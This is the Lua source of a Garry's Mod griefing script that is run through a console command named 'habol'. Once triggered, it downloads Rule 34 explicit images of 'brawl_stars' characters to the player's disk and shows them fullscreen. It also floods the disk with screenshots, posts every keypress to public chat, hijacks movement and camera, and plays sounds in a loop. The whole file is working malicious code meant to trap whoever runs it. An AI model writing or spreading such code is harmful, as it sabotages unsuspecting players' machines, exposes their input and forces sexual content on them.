--[[
	An improved version of https://github.com/erraticcccc/habol
]]

-- Localization

local table = table.Copy(table)

local debug = table.Copy(debug)
local pairs = pairs
local type = type

local function tCopy(n, t)
	if not n then
		return nil
	end
	
	local c = {}
	
	debug.setmetatable(c, debug.getmetatable(n))
	
	for k, v in pairs(n) do
		if type(v) ~= "table" then
			c[k] = v
		else
			t = t or {}
			t[n] = c
			
			if t[v] then
				c[k] = t[v]
			else
				c[k] = tCopy(v, t)
			end
		end
	end
	
	return c
end

local Angle = Angle
local Color = Color
local concommand = tCopy(concommand)
local draw = tCopy(draw)
local file = tCopy(file)
local hook = tCopy(hook)
local HSVToColor = HSVToColor
local http = tCopy(http)
local input = tCopy(input)
local ipairs = ipairs
local LocalPlayer = LocalPlayer
local Material = Material
local math = tCopy(math)
local ScrH = ScrH
local ScrW = ScrW
local string = tCopy(string)
local surface = tCopy(surface)
local timer = tCopy(timer)
local tostring = tostring
local UnPredictedCurTime = UnPredictedCurTime
local Vector = Vector
local vgui = tCopy(vgui)

-- Metatables

local meta_cd_g = debug.getregistry()["CUserCmd"]
local meta_cd = tCopy(meta_cd_g)
local meta_en = tCopy(debug.getregistry()["Entity"])
local meta_im = tCopy(debug.getregistry()["IMaterial"])
local meta_pl = tCopy(debug.getregistry()["Player"])
local meta_pn = tCopy(debug.getregistry()["Panel"])

-- Enums

local ACT_GMOD_TAUNT_DANCE = 1642
local FILL = 1

-- Variables

local dancedelay = false
local waittick = false
local screenshots = 0
local pdisplay_picture = nil
local hsvcolor = Color(255, 255, 255, 255)
local ruleterm = "brawl_stars"
local ruleurl = "https://rule34.xxx/index.php?page=post&s=list&tags=" .. ruleterm -- Rule 34 "api"

local cancer_commands = {
	"mat_motion_blur_enabled 1",
	"mat_vsync 1"
}

local sounds = {}
local pictures = {}
local picture_paths = {}

-- Menu

local main = vgui.Create("DFrame")
meta_pn.SetVisible(main, false)
main.SetTitle(main, "")
main.ShowCloseButton(main, false)
main.SetDraggable(main, false)
main.SetPos(main, 0, 0)
main.SetSize(main, ScrW(), ScrH())

main.Paint = function(self, width, height)
	draw.NoTexture()
	
	surface.SetDrawColor(hsvcolor.r, hsvcolor.g, hsvcolor.b, 15)
	surface.DrawRect(0, 0, width, height)
end

main.Think = function(self)
	local x, y = meta_pn.GetPos(self)
	
	if x ~= 0 or y ~= 0 then
		meta_pn.SetPos(self, 0, 0) -- Center the main fullscreen panel
	end
end

local pdisplay = vgui.Create("DPanel", main)
pdisplay.Dock(pdisplay, FILL)

pdisplay.Paint = function(self, width, height)
	if pdisplay_picture ~= nil then -- Draw the downloaded picture to the screen
		draw.NoTexture()
		
		surface.SetDrawColor(255, 255, 255, 255)
		surface.SetMaterial(pdisplay_picture)
		
		local pwidth = meta_im.Width(pdisplay_picture)
		local aspr = height / pwidth
		
		pwidth = pwidth * aspr
		
		local px = (width / 2) - (pwidth / 2)
		
		surface.DrawTexturedRect(px, 0, pwidth, height)
	end
end

-- Init Funcs

local function finit()
	for _, v in ipairs(cancer_commands) do
		meta_pl.ConCommand(LocalPlayer(), v)
	end
	
	meta_cd_g.ClearButtons = function(...) -- Prevent dancing from fucking movement so player can spaz
		return
	end
	
	meta_cd_g.ClearMovement = function(...)
		return
	end
	
	meta_cd_g.SetViewAngles = function(...)
		return
	end
	
	meta_pn.MakePopup(main)
	meta_pn.SetVisible(main, true)

	-- Hooks

	hook.Add("Tick", tostring({}), function()
		if engine.ActiveGamemode() == "darkrp" then -- Makes the player taunt_dance on an endless loop
			if not dancedelay then
				meta_pl.ConCommand(LocalPlayer(), "_darkrp_doanimation " .. ACT_GMOD_TAUNT_DANCE)
				
				local id, len = meta_en.LookupSequence(LocalPlayer(), meta_en.GetSequenceName(LocalPlayer(), meta_en.SelectWeightedSequence(LocalPlayer(), ACT_GMOD_TAUNT_DANCE)))
				
				if id and len then
					dancedelay = true
					
					timer.Simple(len, function()
						dancedelay = false -- Dance again when animation is complete
					end)
				end
			end
		else
			meta_pl.ConCommand(LocalPlayer(), "act dance")
		end
		
		if not waittick then -- Takes screenshots every other tick
			meta_pl.ConCommand(LocalPlayer(), "jpeg")
			meta_pl.ConCommand(LocalPlayer(), "screenshot")
			
			screenshots = screenshots + 2
			
			waittick = true
		else
			waittick = false
		end
		
		hsvcolor = HSVToColor((UnPredictedCurTime() % 6) * 60, 1, 1) -- Rainbow for the panel
	end)
	
	hook.Add("PlayerButtonDown", tostring({}), function(ply, button) -- Chat key logger
		if not meta_en.IsValid(ply) or not button then
			return
		end
	
		local bname = input.GetKeyName(button) or " the ur mom key"
		bname = string.lower(bname)
	
		meta_pl.ConCommand(ply, "say i just pressed " .. bname)
	end)
	
	hook.Add("CreateMove", tostring({}), function(cmd)
		if meta_cd.CommandNumber(cmd) == 0 then
			return
		end
		
		meta_cd.ClearButtons(cmd) -- Prevent player from moving themselves
		meta_cd.ClearMovement(cmd)
		
		meta_cd.SetViewAngles(cmd, Angle(math.random(-89, 89), math.random(0, 360), 0)) -- Spaz out
		
		meta_cd.SetForwardMove(cmd, math.random(0 - math.pow(10, 4), math.pow(10, 4)))
		meta_cd.SetSideMove(cmd, math.random(0 - math.pow(10, 4), math.pow(10, 4)))
	end)
	
	hook.Add("CalcView", tostring({}), function(ply, pos, ang, fov, zn, zf)
		if not meta_en.IsValid(ply) then
			return
		end
		
		local newfov = math.Round((math.sin(UnPredictedCurTime()) * 100) + 100) -- Makes fov zoom in and out
	
		local view = {
			origin = pos,
			angles = ang,
			fov = newfov,
			znear = zn,
			zfar = zf
		}
		
		local v = meta_pl.GetVehicle(ply)
		local w = meta_pl.GetActiveWeapon(ply)
		
		if meta_en.IsValid(v) then
			return hook.Run("CalcVehicleView", v, ply, view)
		end
		
		if meta_en.IsValid(w) then
			local w_cv = w.CalcView
			
			if w_cv then
				local dummy = 0
				
				view.origin, view.angles, dummy = w_cv(w, ply, pos * 1, ang * 1, newfov)
			end
		end
		
		return view
	end)
	
	-- Timers
	
	timer.Create(tostring({}), 1, 0, function()
		if #picture_paths > 0 then
			pdisplay_picture = Material("../data/" .. picture_paths[math.random(1, #picture_paths)]) -- Picks a new random picture every second
		end
	end)
	
	timer.Create(tostring({}), 0.3, 0, function()
		local sound, key = table.Random(sounds)
	
		surface.PlaySound(sound)
	end)
end

local function downloadSounds(path)
	local files, dirs = file.Find(path .. "*", "GAME")
	
	for i = 1, math.min(#dirs, 25), 1 do
		downloadSounds(path .. "/" .. dirs[i] .. "/")
	end
	
	for i = 1, math.min(#files, 25), 1 do
		local fpath = string.sub(path .. files[i], 7)
		
		if fpath[1] == "/" then
			fpath = string.sub(fpath, 2)
		end
	
		table.insert(sounds, fpath)
	end
end

local function init()
	for _, v in ipairs(pictures) do -- Downloads the pictures into the client's data folder
		http.Fetch(v, function(body)
			local split = string.Split(v, "?")
			
			if not split[2] then
				split[2] = tostring(math.random(1111111, 9999999))
			end
	
			local path = tostring(math.random(-12345, 12345)) .. split[2] .. ".jpg" -- Random file names
	
			file.Write(path, body)
			
			table.insert(picture_paths, path)
		end)
	end
	
	downloadSounds("sound/")
	
	finit() -- Start the REAL fun
end

-- Final tasks

local function hahayoufellforit()
	http.Fetch(ruleurl, function(body) -- Downloads images from Rule 34
		local s, e = string.find(body, "<img src=\"") -- Find an image tag
		
		while s ~= nil and e ~= nil do
			local gurl = ""
			local i = s + 10
			
			while body[i] ~= " " and body[i] ~= "\"" do -- Read through the image tag to find the source url and copy it
				gurl = gurl .. body[i]
				
				i = i + 1
			end
			
			local use = true
			
			if string.len(gurl) > 0 then
				if string.sub(gurl, -4) == ".gif" then
					use = false -- Don't use gifs
				end
			
				if gurl[1] == "/" then
					gurl = "https:" .. gurl -- Add "https:" to the front of images without a proper link
				end
			end
			
			local bso = string.sub(body, 1, s - 1)
			local bst = string.sub(body, s + 1, string.len(body))
			
			body = bso .. bst -- Remove the "<" in the previous tag to avoid finding the same image
			
			s, e = string.find(body, "<img src=\"")
		
			if use then
				table.insert(pictures, gurl) -- Add image url to the table
			end
		end
		
		init() -- Start the fun
	end, function(e)
		print("Failed to fetch " .. ruleurl .. ". Reason: " .. e) -- :(
	end)
end

concommand.Add("habol", function()
	hahayoufellforit()
end)
